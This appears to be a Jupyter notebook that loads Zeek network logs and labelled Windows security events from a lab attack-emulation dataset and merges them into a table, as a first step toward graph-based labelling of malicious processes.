# %% [markdown]
# # NetworkX - beagle - Labelling
# ------------------

# %% [markdown]
# - ID Bad Processes in the Malicious Subgraph
# - ID Bad Files + Bad Reg Keys in the Malicious Subgraph
# - See if Bad Files + Bad Reg Keys show up in the ancestor chain elsewhere
# - Add those processes to the Bad Processes List
# - Try to solve the Lateral Movement Missing Edge...

# %% [markdown]
# # Preparation

# %%
import pandas as pd, numpy as np, networkx as nx
import matplotlib.pyplot as plt
from matplotlib.pyplot import figure
from sklearn.ensemble import RandomForestClassifier
from sklearn.feature_selection import chi2
from sklearn.linear_model.logistic import LogisticRegression
pd.options.display.max_columns = 500
pd.options.display.max_colwidth = 500
# Out:
# /home/jake/miniconda3/envs/py3msc/lib/python3.7/site-packages/sklearn/utils/deprecation.py:143: FutureWarning: The sklearn.linear_model.logistic module is  deprecated in version 0.22 and will be removed in version 0.24. The corresponding classes / functions should instead be imported from sklearn.linear_model. Anything that cannot be imported from sklearn.linear_model is now part of the private API.
#   warnings.warn(message, FutureWarning)

# %%
df_zeek = pd.read_json("combined_zeek.log", lines = True)
df_zeek.replace('nan', np.nan, inplace=True)
print(type(df_zeek))
print(df_zeek.shape)
#print(df_zeek.EventID.value_counts())
df_zeek.head()
# Out:
# <class 'pandas.core.frame.DataFrame'>
# (2140, 148)
#   @stream              @system @proc            ts                 uid  \
# 0    conn  bobs.bigwheel.local  zeek  1.588205e+09  Cvf4XX17hSAgXDdGEd
# 1    conn  bobs.bigwheel.local  zeek  1.588205e+09  CJ21Le4zsTUcyKKi98
# 2    conn  bobs.bigwheel.local  zeek  1.588205e+09  CnOP7t1eGGHf6LFfuk
# 3    conn  bobs.bigwheel.local  zeek  1.588205e+09  CvxbPE3MuO7boUdSc8
# 4    conn  bobs.bigwheel.local  zeek  1.588205e+09  CuRbE21APSQo2qd6rk
#
#   id_orig_h  id_orig_p   id_resp_h  id_resp_p proto         service  \
# 0  10.0.1.6    54243.0    10.0.0.4       53.0   udp             dns
# 1  10.0.1.6    56880.0    10.0.0.4      445.0   tcp  gssapi,smb,krb
# 2  10.0.1.6    65108.0    10.0.0.4       53.0   udp             dns
# 3  10.0.1.6      138.0  10.0.1.255      138.0   udp             NaN
# 4  10.0.1.6      123.0    10.0.0.4      123.0   udp             NaN
#
#     duration  orig_bytes  resp_bytes conn_state  missed_bytes  history  \
# 0   0.001528        39.0        55.0         SF           0.0       Dd
# 1  10.761077      4020.0      1681.0       RSTO           0.0  ShADdaR
# 2   0.001599        36.0       104.0         SF           0.0       Dd
# 3        NaN         NaN         NaN         S0           0.0        D
# 4   0.003069       120.0       120.0         SF           0.0       Dd
#
#    orig_pkts  orig_ip_bytes  resp_pkts  resp_ip_bytes       orig_l2_addr  \
# 0        1.0           67.0        1.0           83.0  00:0d:3a:13:e3:69
# 1       12.0         1307.0       11.0         2133.0  00:0d:3a:13:e3:69
# 2        1.0           64.0        1.0          132.0  00:0d:3a:13:e3:69
# 3        1.0          229.0        0.0            0.0  00:0d:3a:13:e3:69
# 4        1.0          148.0        1.0          148.0  00:0d:3a:13:e3:69
#
#         resp_l2_addr  rtt named_pipe endpoint operation  trans_id query  \
# 0  12:34:56:78:9a:bc  NaN        NaN      NaN       NaN       NaN   NaN
# 1  12:34:56:78:9a:bc  NaN        NaN      NaN       NaN       NaN   NaN
# 2  12:34:56:78:9a:bc  NaN        NaN      NaN       NaN       NaN   NaN
# 3  ff:ff:ff:ff:ff:ff  NaN        NaN      NaN       NaN       NaN   NaN
# 4  12:34:56:78:9a:bc  NaN        NaN      NaN       NaN       NaN   NaN
#
#    qclass qclass_name  qtype qtype_name  rcode rcode_name  AA  TC  RD  RA   Z  \
# 0     NaN         NaN    NaN        NaN    NaN        NaN NaN NaN NaN NaN NaN
# 1     NaN         NaN    NaN        NaN    NaN        NaN NaN NaN NaN NaN NaN
# 2     NaN         NaN    NaN        NaN    NaN        NaN NaN NaN NaN NaN NaN
# 3     NaN         NaN    NaN        NaN    NaN        NaN NaN NaN NaN NaN NaN
# 4     NaN         NaN    NaN        NaN    NaN        NaN NaN NaN NaN NaN NaN
#
#   answers TTLs  rejected analyzer failure_reason fuid tx_hosts rx_hosts  \
# 0     NaN  NaN       NaN      NaN            NaN  NaN      NaN      NaN
# 1     NaN  NaN       NaN      NaN            NaN  NaN      NaN      NaN
# 2     NaN  NaN       NaN      NaN            NaN  NaN      NaN      NaN
# 3     NaN  NaN       NaN      NaN            NaN  NaN      NaN      NaN
# 4     NaN  NaN       NaN      NaN            NaN  NaN      NaN      NaN
#
#   conn_uids source  depth analyzers mime_type filename  is_orig  seen_bytes  \
# 0       NaN    NaN    NaN       NaN       NaN      NaN      NaN         NaN
# 1       NaN    NaN    NaN       NaN       NaN      NaN      NaN         NaN
# 2       NaN    NaN    NaN       NaN       NaN      NaN      NaN         NaN
# 3       NaN    NaN    NaN       NaN       NaN      NaN      NaN         NaN
# 4       NaN    NaN    NaN       NaN       NaN      NaN      NaN         NaN
#
#    total_bytes  missing_bytes  overflow_bytes  timedout  md5 sha1  \
# 0          NaN            NaN             NaN       NaN  NaN  NaN
# 1          NaN            NaN             NaN       NaN  NaN  NaN
# 2          NaN            NaN             NaN       NaN  NaN  NaN
# 3          NaN            NaN             NaN       NaN  NaN  NaN
# 4          NaN            NaN             NaN       NaN  NaN  NaN
#
#   request_type client  success error_msg  till  forwardable  renewable cipher  \
# 0          NaN    NaN      NaN       NaN   NaN          NaN        NaN    NaN
# 1          NaN    NaN      NaN       NaN   NaN          NaN        NaN    NaN
# 2          NaN    NaN      NaN       NaN   NaN          NaN        NaN    NaN
# 3          NaN    NaN      NaN       NaN   NaN          NaN        NaN    NaN
# 4          NaN    NaN      NaN       NaN   NaN          NaN        NaN    NaN
#
#   note  msg  sub  src  dst   p actions  suppress_for action path name  size  \
# 0  NaN  NaN  NaN  NaN  NaN NaN     NaN           NaN    NaN  NaN  NaN   NaN
# 1  NaN  NaN  NaN  NaN  NaN NaN     NaN           NaN    NaN  NaN  NaN   NaN
# 2  NaN  NaN  NaN  NaN  NaN NaN     NaN           NaN    NaN  NaN  NaN   NaN
# 3  NaN  NaN  NaN  NaN  NaN NaN     NaN           NaN    NaN  NaN  NaN   NaN
# 4  NaN  NaN  NaN  NaN  NaN NaN     NaN           NaN    NaN  NaN  NaN   NaN
#
#    times_modified  times_accessed  times_created  times_changed share_type  \
# 0             NaN             NaN            NaN            NaN        NaN
# 1             NaN             NaN            NaN            NaN        NaN
# 2             NaN             NaN            NaN            NaN        NaN
# 3             NaN             NaN            NaN            NaN        NaN
# 4             NaN             NaN            NaN            NaN        NaN
#
#   version curve server_name  resumed  established cert_chain_fuids  \
# 0     NaN   NaN         NaN      NaN          NaN              NaN
# 1     NaN   NaN         NaN      NaN          NaN              NaN
# 2     NaN   NaN         NaN      NaN          NaN              NaN
# 3     NaN   NaN         NaN      NaN          NaN              NaN
# 4     NaN   NaN         NaN      NaN          NaN              NaN
#
#   client_cert_chain_fuids subject issuer validation_status  \
# 0                     NaN     NaN    NaN               NaN
# 1                     NaN     NaN    NaN               NaN
# 2                     NaN     NaN    NaN               NaN
# 3                     NaN     NaN    NaN               NaN
# 4                     NaN     NaN    NaN               NaN
#
#   resp_certificate_sha1  ja3 ja3s  notice peer  addl   id  \
# 0                   NaN  NaN  NaN     NaN  NaN   NaN  NaN
# 1                   NaN  NaN  NaN     NaN  NaN   NaN  NaN
# 2                   NaN  NaN  NaN     NaN  NaN   NaN  NaN
# 3                   NaN  NaN  NaN     NaN  NaN   NaN  NaN
# 4                   NaN  NaN  NaN     NaN  NaN   NaN  NaN
#
#    certificate_version certificate_serial certificate_subject  \
# 0                  NaN                NaN                 NaN
# 1                  NaN                NaN                 NaN
# 2                  NaN                NaN                 NaN
# 3                  NaN                NaN                 NaN
# 4                  NaN                NaN                 NaN
#
#   certificate_issuer  certificate_not_valid_before  \
# 0                NaN                           NaN
# 1                NaN                           NaN
# 2                NaN                           NaN
# 3                NaN                           NaN
# 4                NaN                           NaN
#
#    certificate_not_valid_after certificate_key_alg certificate_sig_alg  \
# 0                          NaN                 NaN                 NaN
# 1                          NaN                 NaN                 NaN
# 2                          NaN                 NaN                 NaN
# 3                          NaN                 NaN                 NaN
# 4                          NaN                 NaN                 NaN
#
#   certificate_key_type  certificate_key_length  certificate_exponent  \
# 0                  NaN                     NaN                   NaN
# 1                  NaN                     NaN                   NaN
# 2                  NaN                     NaN                   NaN
# 3                  NaN                     NaN                   NaN
# 4                  NaN                     NaN                   NaN
#
#    basic_constraints_ca extracted  extracted_cutoff  trans_depth method host  \
# 0                   NaN       NaN               NaN          NaN    NaN  NaN
# 1                   NaN       NaN               NaN          NaN    NaN  NaN
# 2                   NaN       NaN               NaN          NaN    NaN  NaN
# 3                   NaN       NaN               NaN          NaN    NaN  NaN
# 4                   NaN       NaN               NaN          NaN    NaN  NaN
#
#    uri user_agent  request_body_len  response_body_len  status_code  \
# 0  NaN        NaN               NaN                NaN          NaN
# 1  NaN        NaN               NaN                NaN          NaN
# 2  NaN        NaN               NaN                NaN          NaN
# 3  NaN        NaN               NaN                NaN          NaN
# 4  NaN        NaN               NaN                NaN          NaN
#
#   status_msg tags resp_fuids resp_mime_types client_header_names orig_fuids  \
# 0        NaN  NaN        NaN             NaN                 NaN        NaN
# 1        NaN  NaN        NaN             NaN                 NaN        NaN
# 2        NaN  NaN        NaN             NaN                 NaN        NaN
# 3        NaN  NaN        NaN             NaN                 NaN        NaN
# 4        NaN  NaN        NaN             NaN                 NaN        NaN
#
#   orig_mime_types machine  compile_ts   os subsystem  is_exe  is_64bit  \
# 0             NaN     NaN         NaN  NaN       NaN     NaN       NaN
# 1             NaN     NaN         NaN  NaN       NaN     NaN       NaN
# 2             NaN     NaN         NaN  NaN       NaN     NaN       NaN
# 3             NaN     NaN         NaN  NaN       NaN     NaN       NaN
# 4             NaN     NaN         NaN  NaN       NaN     NaN       NaN
#
#    uses_aslr  uses_dep  uses_code_integrity  uses_seh  has_import_table  \
# 0        NaN       NaN                  NaN       NaN               NaN
# 1        NaN       NaN                  NaN       NaN               NaN
# 2        NaN       NaN                  NaN       NaN               NaN
# 3        NaN       NaN                  NaN       NaN               NaN
# 4        NaN       NaN                  NaN       NaN               NaN
#
#    has_export_table  has_cert_table  has_debug_data section_names
# 0               NaN             NaN             NaN           NaN
# 1               NaN             NaN             NaN           NaN
# 2               NaN             NaN             NaN           NaN
# 3               NaN             NaN             NaN           NaN
# 4               NaN             NaN             NaN           NaN

# %%
df_label = pd.read_json('./df_labelled_coalesce.json', lines=True)
df_label['TP_Binary'] = df_label.TP_Label!='0'
df_label.replace('-', np.nan, inplace=True)
print(type(df_label))
print(df_label.shape)
print(df_label.EventID.value_counts())
df_label.head(1)
# Out:
# <class 'pandas.core.frame.DataFrame'>
# (198760, 390)
# 12       61158
# 10       39286
# 7        20259
# 13       17542
# 4658     10973
#          ...
# 172          1
# 46           1
# 50103        1
# 306          1
# 41           1
# Name: EventID, Length: 165, dtype: int64
#                  @timestamp  @version                            Category  \
# 0  2020-05-02T03:20:47.897Z         1  Kerberos Service Ticket Operations
#
#     Channel  EventID    EventReceivedTime            EventTime      EventType  \
# 0  Security     4769  2020-05-01 23:20:47  2020-05-01 23:20:46  AUDIT_SUCCESS
#
#    ExecutionProcessID               Hostname        IpAddress IpPort  \
# 0                 704  NEWYORK.dmevals.local  ::ffff:10.0.1.4  49764
#
#               Keywords                               LogonGuid  \
# 0 -9214364837600034816  {fe5dd628-f256-ba1b-3123-bfa971bd494a}
#
#                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                Message  \
# 0  A Kerberos service ticket was requested.\r\n\r\nAccount Information:\r\n\tAccount Name:\t\tpbeesly@DMEVALS.LOCAL\r\n\tAccount Domain:\t\tDMEVALS.LOCAL\r\n\tLogon GUID:\t\t{fe5dd628-f256-ba1b-3123-bfa971bd494a}\r\n\r\nService Information:\r\n\tService Name:\t\tNEWYORK$\r\n\tService ID:\t\tS-1-5-21-1830255721-3727074217-2423397540-1000\r\n\r\nNetwork Information:\r\n\tClient Address:\t\t::ffff:10.0.1.4\r\n\tClient Port:\t\t49764\r\n\r\nAdditional Information:\r\n\tTicket Options:\t\t0x40800000...
#
#   Opcode  OpcodeValue                            ProviderGuid  RecordNumber  \
# 0   Info          0.0  {54849625-5478-4994-A5BA-3E3B0328C30D}        156121
#
#   ServiceName                                      ServiceSid Severity  \
# 0    NEWYORK$  S-1-5-21-1830255721-3727074217-2423397540-1000     INFO
#
#    SeverityValue SourceModuleName SourceModuleType  \
# 0              2         eventlog    im_msvistalog
#
#                             SourceName Status TargetDomainName  \
# 0  Microsoft-Windows-Security-Auditing    0x0    DMEVALS.LOCAL
#
#           TargetUserName   Task  ThreadID TicketEncryptionType TicketOptions  \
# 0  pbeesly@DMEVALS.LOCAL  14337      3504                 0x12    0x40800000
#
#    TransmittedServices  Version                       host   port  \
# 0                  NaN      0.0  wec.internal.cloudapp.net  60737
#
#               tags TP_Label Action ActivityID CalloutKey CalloutName  \
# 0  [mordorDataset]        0    NaN        NaN        NaN         NaN
#
#   ChangeType Conditions  FilterId FilterKey FilterName FilterType  LayerId  \
# 0        NaN        NaN       NaN       NaN        NaN        NaN      NaN
#
#   LayerKey LayerName ProcessId ProviderKey ProviderName UserName UserSid  \
# 0      NaN       NaN       NaN         NaN          NaN      NaN     NaN
#
#    Weight AccessList AccessMask AccessReason HandleId ObjectName ObjectServer  \
# 0     NaN        NaN        NaN          NaN      NaN        NaN          NaN
#
#   ObjectType PrivilegeList ProcessName  ResourceAttributes  \
# 0        NaN           NaN         NaN                 NaN
#
#    RestrictedSidCount SubjectDomainName SubjectLogonId SubjectUserName  \
# 0                 NaN               NaN            NaN             NaN
#
#   SubjectUserSid TransactionId ShareLocalPath ShareName RelativeTargetName  \
# 0            NaN           NaN            NaN       NaN                NaN
#
#   CommandLine MandatoryLabel NewProcessId NewProcessName ParentProcessName  \
# 0         NaN            NaN          NaN            NaN               NaN
#
#   TargetLogonId TargetUserSid TokenElevationType Service  \
# 0           NaN           NaN                NaN     NaN
#
#   DisabledPrivilegeList EnabledPrivilegeList CallerProcessId  \
# 0                   NaN                  NaN             NaN
#
#   CallerProcessName TargetSid AuthenticationPackageName ElevatedToken  \
# 0               NaN       NaN                       NaN           NaN
#
#   ImpersonationLevel  KeyLength LmPackageName LogonProcessName  LogonType  \
# 0                NaN        NaN           NaN              NaN        NaN
#
#   RestrictedAdminMode TargetLinkedLogonId  TargetOutboundDomainName  \
# 0                 NaN                 NaN                       NaN
#
#    TargetOutboundUserName VirtualAccount WorkstationName SourceHandleId  \
# 0                     NaN            NaN             NaN            NaN
#
#   SourceProcessId TargetHandleId TargetProcessId AccountName AccountType  \
# 0             NaN            NaN             NaN         NaN         NaN
#
#   ContextInfo Domain Payload UserID  NewThreadId RuleName SourceImage  \
# 0         NaN    NaN     NaN    NaN          NaN      NaN         NaN
#
#   SourceProcessGuid StartAddress StartFunction StartModule TargetImage  \
# 0               NaN          NaN           NaN         NaN         NaN
#
#   TargetProcessGuid UtcTime  MessageNumber  MessageTotal Path ScriptBlockId  \
# 0               NaN     NaN            NaN           NaN  NaN           NaN
#
#   ScriptBlockText AlgorithmName KeyName KeyType Operation ReturnCode Archived  \
# 0             NaN           NaN     NaN     NaN       NaN        NaN      NaN
#
#   Hashes Image IsExecutable ProcessGuid TargetFilename User CreationUtcTime  \
# 0    NaN   NaN          NaN         NaN            NaN  NaN             NaN
#
#   Company Description FileVersion ImageLoaded OriginalFileName Product  \
# 0     NaN         NaN         NaN         NaN              NaN     NaN
#
#   Signature SignatureStatus Signed  DestinationHostname DestinationIp  \
# 0       NaN             NaN    NaN                  NaN           NaN
#
#   DestinationIsIpv6  DestinationPort  DestinationPortName Initiated Protocol  \
# 0               NaN              NaN                  NaN       NaN      NaN
#
#    SourceHostname SourceIp SourceIsIpv6  SourcePort  SourcePortName NewSd  \
# 0             NaN      NaN          NaN         NaN             NaN   NaN
#
#   OldSd PipeName CurrentDirectory IntegrityLevel LogonId ParentCommandLine  \
# 0   NaN      NaN              NaN            NaN     NaN               NaN
#
#   ParentImage ParentProcessGuid  ParentProcessId  TerminalSessionId CallTrace  \
# 0         NaN               NaN              NaN                NaN       NaN
#
#   GrantedAccess SourceProcessGUID  SourceThreadId TargetProcessGUID Device  \
# 0           NaN               NaN             NaN               NaN    NaN
#
#   TargetObject Details Application  FilterRTID  LayerRTID SourceAddress  \
# 0          NaN     NaN         NaN         NaN        NaN           NaN
#
#   DestAddress  DestPort Direction RemoteMachineID RemoteUserID  \
# 0         NaN       NaN       NaN             NaN          NaN
#
#    BootMenuPolicy NewValue NewValueType ObjectValueName OldValue OldValueType  \
# 0             NaN      NaN          NaN             NaN      NaN          NaN
#
#   OperationType ProfileUsed RuleId QueryName QueryResults  QueryStatus  \
# 0           NaN         NaN    NaN       NaN          NaN          NaN
#
#   PreviousCreationUtcTime  EventCountTotal  EventIdx GroupMembership param1  \
# 0                     NaN              NaN       NaN             NaN    NaN
#
#   Properties Hash  PreAuthType  ClientProcessId  CountOfCredentialsReturned  \
# 0        NaN  NaN          NaN              NaN                         NaN
#
#   ProcessCreationTime ReadOperation TargetName  Type  CalloutId CalloutType  \
# 0                 NaN           NaN        NaN   NaN        NaN         NaN
#
#    CorruptionActionState DeviceName DriveName  Config  IsTestConfig  \
# 0                    NaN        NaN       NaN     NaN           NaN
#
#    DirtyPages HiveName  HiveNameLength  KeysUpdated PackageName Workstation  \
# 0         NaN      NaN             NaN          NaN         NaN         NaN
#
#    DeviceNameLength DeviceTime  DeviceVersionMajor  DeviceVersionMinor  \
# 0               NaN        NaN                 NaN                 NaN
#
#   FinalStatus UserData ServiceAccount ServiceFileName  ServiceStartType  \
# 0         NaN      NaN            NaN             NaN               NaN
#
#   ServiceType param10 param11 param2 param3 param4 param5 param6 param7  \
# 0         NaN     NaN     NaN    NaN    NaN    NaN    NaN    NaN    NaN
#
#   param8 param9 SubLayerKey SubLayerName SubLayerType Default SD String:  \
# 0    NaN    NaN         NaN          NaN          NaN                NaN
#
#   ClassId ClassName CompatibleIds DeviceDescription DeviceId  \
# 0     NaN       NaN           NaN               NaN      NaN
#
#    LocationInformation VendorIds TargetProcessName SecurityPackageName  \
# 0                  NaN       NaN               NaN                 NaN
#
#    AdditionalInfo  AdditionalInfo2 ProviderType RuleAttr AdapterName  \
# 0             NaN              NaN          NaN      NaN         NaN
#
#   AdapterSuffixName DnsServerList  ErrorCode Ipaddress Sent UpdateServer  \
# 0               NaN           NaN        NaN       NaN               NaN
#
#   TaskContentNew TaskName ActiveProfile MiniportName  MiniportNameLen  \
# 0            NaN      NaN           NaN          NaN              NaN
#
#   GroupPolicyApplied LogDroppedPacketsEnabled LogSuccessfulConnectionsEnabled  \
# 0                NaN                      NaN                             NaN
#
#   MulticastFlowsEnabled OperationMode Profile RemoteAdminEnabled TargetInfo  \
# 0                   NaN           NaN     NaN                NaN        NaN
#
#   TargetLogonGuid TargetServerName ClientCreationTime TimeSource ImagePath  \
# 0             NaN              NaN                NaN        NaN       NaN
#
#   StartType ProfileChanged  BootType LoadOptions  EntryCount KeyFilePath  \
# 0       NaN            NaN       NaN         NaN         NaN         NaN
#
#   ProviderContextKey ProviderContextName ProviderContextType  DwordVal  \
# 0                NaN                 NaN                 NaN       NaN
#
#   InterfaceGuid InterfaceName  NewProfile  OldProfile InstanceId  \
# 0           NaN           NaN         NaN         NaN        NaN
#
#    MaxRunspaces  MinRunspaces  CurrentStratumNumber  TimeSourceRefId  \
# 0           NaN           NaN                   NaN              NaN
#
#   ReasonForRejection  Active  EdgeTraversal EmbeddedContext  Flags  \
# 0                NaN     NaN            NaN             NaN    NaN
#
#   LocalAddresses  LocalOnlyMapped  LooseSourceMapped ModifyingApplication  \
# 0            NaN              NaN                NaN                  NaN
#
#   ModifyingUser  Origin  Profiles RemoteAddresses  RuleStatus  SchemaVersion  \
# 0           NaN     NaN       NaN             NaN         NaN            NaN
#
#    SecurityOptions  CountNew  CountOld EnabledNew  UpdateReason NewTime  \
# 0              NaN       NaN       NaN        NaN           NaN     NaN
#
#   PreviousTime NotificationPackageName  ShutdownActionType  ShutdownEventCode  \
# 0          NaN                     NaN                 NaN                NaN
#
#    ShutdownReason  BootMode  BuildVersion  MajorVersion  MinorVersion  \
# 0             NaN       NaN           NaN           NaN           NaN
#
#    QfeVersion  ServiceVersion StartTime  EnableDisableReason  VsmPolicy  \
# 0         NaN             NaN       NaN                  NaN        NaN
#
#   DCName  ProcessingMode  ProcessingTimeInMilliseconds  SupportInfo1  \
# 0    NaN             NaN                           NaN           NaN
#
#    SupportInfo2  Group  IdleImplementation  IdleStateCount  \
# 0           NaN    NaN                 NaN             NaN
#
#    MaximumPerformancePercent  MinimumPerformancePercent  \
# 0                        NaN                        NaN
#
#    MinimumThrottlePercent  NominalFrequency  Number  \
# 0                     NaN               NaN     NaN
#
#    PerformanceImplementation StopTime FileName LinkName AdvancedOptions  \
# 0                        NaN      NaN      NaN      NaN             NaN
#
#   ConfigAccessPolicy DisableIntegrityChecks FlightSigning HypervisorDebug  \
# 0                NaN                    NaN           NaN             NaN
#
#   HypervisorLaunchType  HypervisorLoadOptions KernelDebug RemoteEventLogging  \
# 0                  NaN                    NaN         NaN                NaN
#
#   TestSigning VsmLaunchType  TSId  BootStatusPolicy LastBootGood  LastBootId  \
# 0         NaN           NaN   NaN               NaN          NaN         NaN
#
#   LastShutdownGood  PuaCount PuaPolicyId  BitlockerUserInputTime OldTime  \
# 0              NaN       NaN         NaN                     NaN     NaN
#
#    Reason State  SettingType  SettingValue SettingValueDisplay  \
# 0     NaN   NaN          NaN           NaN                 NaN
#
#    SettingValueSize  VersionLen  TP_Binary
# 0               NaN         NaN      False

# %%
# https://pandas.pydata.org/pandas-docs/stable/user_guide/merging.html
#    In [9]: result = pd.concat([df1, df4], axis=1, sort=False)
df_label = df_label.append(df_zeek, ignore_index=True, sort=False)

# %%
df_label.shape
# Out:
# (200900, 536)

# %%
df_label.head(1)
# Out:
#                  @timestamp  @version                            Category  \
# 0  2020-05-02T03:20:47.897Z       1.0  Kerberos Service Ticket Operations
#
#     Channel  EventID    EventReceivedTime            EventTime      EventType  \
# 0  Security   4769.0  2020-05-01 23:20:47  2020-05-01 23:20:46  AUDIT_SUCCESS
#
#    ExecutionProcessID               Hostname        IpAddress IpPort  \
# 0               704.0  NEWYORK.dmevals.local  ::ffff:10.0.1.4  49764
#
#        Keywords                               LogonGuid  \
# 0 -9.214365e+18  {fe5dd628-f256-ba1b-3123-bfa971bd494a}
#
#                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                Message  \
# 0  A Kerberos service ticket was requested.\r\n\r\nAccount Information:\r\n\tAccount Name:\t\tpbeesly@DMEVALS.LOCAL\r\n\tAccount Domain:\t\tDMEVALS.LOCAL\r\n\tLogon GUID:\t\t{fe5dd628-f256-ba1b-3123-bfa971bd494a}\r\n\r\nService Information:\r\n\tService Name:\t\tNEWYORK$\r\n\tService ID:\t\tS-1-5-21-1830255721-3727074217-2423397540-1000\r\n\r\nNetwork Information:\r\n\tClient Address:\t\t::ffff:10.0.1.4\r\n\tClient Port:\t\t49764\r\n\r\nAdditional Information:\r\n\tTicket Options:\t\t0x40800000...
#
#   Opcode  OpcodeValue                            ProviderGuid  RecordNumber  \
# 0   Info          0.0  {54849625-5478-4994-A5BA-3E3B0328C30D}      156121.0
#
#   ServiceName                                      ServiceSid Severity  \
# 0    NEWYORK$  S-1-5-21-1830255721-3727074217-2423397540-1000     INFO
#
#    SeverityValue SourceModuleName SourceModuleType  \
# 0            2.0         eventlog    im_msvistalog
#
#                             SourceName Status TargetDomainName  \
# 0  Microsoft-Windows-Security-Auditing    0x0    DMEVALS.LOCAL
#
#           TargetUserName     Task  ThreadID TicketEncryptionType  \
# 0  pbeesly@DMEVALS.LOCAL  14337.0    3504.0                 0x12
#
#   TicketOptions  TransmittedServices  Version                       host  \
# 0    0x40800000                  NaN      0.0  wec.internal.cloudapp.net
#
#       port             tags TP_Label Action ActivityID CalloutKey CalloutName  \
# 0  60737.0  [mordorDataset]        0    NaN        NaN        NaN         NaN
#
#   ChangeType Conditions  FilterId FilterKey FilterName FilterType  LayerId  \
# 0        NaN        NaN       NaN       NaN        NaN        NaN      NaN
#
#   LayerKey LayerName ProcessId ProviderKey ProviderName UserName UserSid  \
# 0      NaN       NaN       NaN         NaN          NaN      NaN     NaN
#
#    Weight AccessList AccessMask AccessReason HandleId ObjectName ObjectServer  \
# 0     NaN        NaN        NaN          NaN      NaN        NaN          NaN
#
#   ObjectType PrivilegeList ProcessName  ResourceAttributes  \
# 0        NaN           NaN         NaN                 NaN
#
#    RestrictedSidCount SubjectDomainName SubjectLogonId SubjectUserName  \
# 0                 NaN               NaN            NaN             NaN
#
#   SubjectUserSid TransactionId ShareLocalPath ShareName RelativeTargetName  \
# 0            NaN           NaN            NaN       NaN                NaN
#
#   CommandLine MandatoryLabel NewProcessId NewProcessName ParentProcessName  \
# 0         NaN            NaN          NaN            NaN               NaN
#
#   TargetLogonId TargetUserSid TokenElevationType Service  \
# 0           NaN           NaN                NaN     NaN
#
#   DisabledPrivilegeList EnabledPrivilegeList CallerProcessId  \
# 0                   NaN                  NaN             NaN
#
#   CallerProcessName TargetSid AuthenticationPackageName ElevatedToken  \
# 0               NaN       NaN                       NaN           NaN
#
#   ImpersonationLevel  KeyLength LmPackageName LogonProcessName  LogonType  \
# 0                NaN        NaN           NaN              NaN        NaN
#
#   RestrictedAdminMode TargetLinkedLogonId  TargetOutboundDomainName  \
# 0                 NaN                 NaN                       NaN
#
#    TargetOutboundUserName VirtualAccount WorkstationName SourceHandleId  \
# 0                     NaN            NaN             NaN            NaN
#
#   SourceProcessId TargetHandleId TargetProcessId AccountName AccountType  \
# 0             NaN            NaN             NaN         NaN         NaN
#
#   ContextInfo Domain Payload UserID  NewThreadId RuleName SourceImage  \
# 0         NaN    NaN     NaN    NaN          NaN      NaN         NaN
#
#   SourceProcessGuid StartAddress StartFunction StartModule TargetImage  \
# 0               NaN          NaN           NaN         NaN         NaN
#
#   TargetProcessGuid UtcTime  MessageNumber  MessageTotal Path ScriptBlockId  \
# 0               NaN     NaN            NaN           NaN  NaN           NaN
#
#   ScriptBlockText AlgorithmName KeyName KeyType Operation ReturnCode Archived  \
# 0             NaN           NaN     NaN     NaN       NaN        NaN      NaN
#
#   Hashes Image IsExecutable ProcessGuid TargetFilename User CreationUtcTime  \
# 0    NaN   NaN          NaN         NaN            NaN  NaN             NaN
#
#   Company Description FileVersion ImageLoaded OriginalFileName Product  \
# 0     NaN         NaN         NaN         NaN              NaN     NaN
#
#   Signature SignatureStatus Signed  DestinationHostname DestinationIp  \
# 0       NaN             NaN    NaN                  NaN           NaN
#
#   DestinationIsIpv6  DestinationPort  DestinationPortName Initiated Protocol  \
# 0               NaN              NaN                  NaN       NaN      NaN
#
#    SourceHostname SourceIp SourceIsIpv6  SourcePort  SourcePortName NewSd  \
# 0             NaN      NaN          NaN         NaN             NaN   NaN
#
#   OldSd PipeName CurrentDirectory IntegrityLevel LogonId ParentCommandLine  \
# 0   NaN      NaN              NaN            NaN     NaN               NaN
#
#   ParentImage ParentProcessGuid  ParentProcessId  TerminalSessionId CallTrace  \
# 0         NaN               NaN              NaN                NaN       NaN
#
#   GrantedAccess SourceProcessGUID  SourceThreadId TargetProcessGUID Device  \
# 0           NaN               NaN             NaN               NaN    NaN
#
#   TargetObject Details Application  FilterRTID  LayerRTID SourceAddress  \
# 0          NaN     NaN         NaN         NaN        NaN           NaN
#
#   DestAddress  DestPort Direction RemoteMachineID RemoteUserID  \
# 0         NaN       NaN       NaN             NaN          NaN
#
#    BootMenuPolicy NewValue NewValueType ObjectValueName OldValue OldValueType  \
# 0             NaN      NaN          NaN             NaN      NaN          NaN
#
#   OperationType ProfileUsed RuleId QueryName QueryResults  QueryStatus  \
# 0           NaN         NaN    NaN       NaN          NaN          NaN
#
#   PreviousCreationUtcTime  EventCountTotal  EventIdx GroupMembership param1  \
# 0                     NaN              NaN       NaN             NaN    NaN
#
#   Properties Hash  PreAuthType  ClientProcessId  CountOfCredentialsReturned  \
# 0        NaN  NaN          NaN              NaN                         NaN
#
#   ProcessCreationTime ReadOperation TargetName  Type  CalloutId CalloutType  \
# 0                 NaN           NaN        NaN   NaN        NaN         NaN
#
#    CorruptionActionState DeviceName DriveName  Config  IsTestConfig  \
# 0                    NaN        NaN       NaN     NaN           NaN
#
#    DirtyPages HiveName  HiveNameLength  KeysUpdated PackageName Workstation  \
# 0         NaN      NaN             NaN          NaN         NaN         NaN
#
#    DeviceNameLength DeviceTime  DeviceVersionMajor  DeviceVersionMinor  \
# 0               NaN        NaN                 NaN                 NaN
#
#   FinalStatus UserData ServiceAccount ServiceFileName  ServiceStartType  \
# 0         NaN      NaN            NaN             NaN               NaN
#
#   ServiceType param10 param11 param2 param3 param4 param5 param6 param7  \
# 0         NaN     NaN     NaN    NaN    NaN    NaN    NaN    NaN    NaN
#
#   param8 param9  ... TargetLogonGuid TargetServerName ClientCreationTime  \
# 0    NaN    NaN  ...             NaN              NaN                NaN
#
#   TimeSource ImagePath StartType ProfileChanged BootType LoadOptions  \
# 0        NaN       NaN       NaN            NaN      NaN         NaN
#
#    EntryCount KeyFilePath ProviderContextKey ProviderContextName  \
# 0         NaN         NaN                NaN                 NaN
#
#    ProviderContextType  DwordVal InterfaceGuid InterfaceName NewProfile  \
# 0                  NaN       NaN           NaN           NaN        NaN
#
#   OldProfile InstanceId  MaxRunspaces MinRunspaces CurrentStratumNumber  \
# 0        NaN        NaN           NaN          NaN                  NaN
#
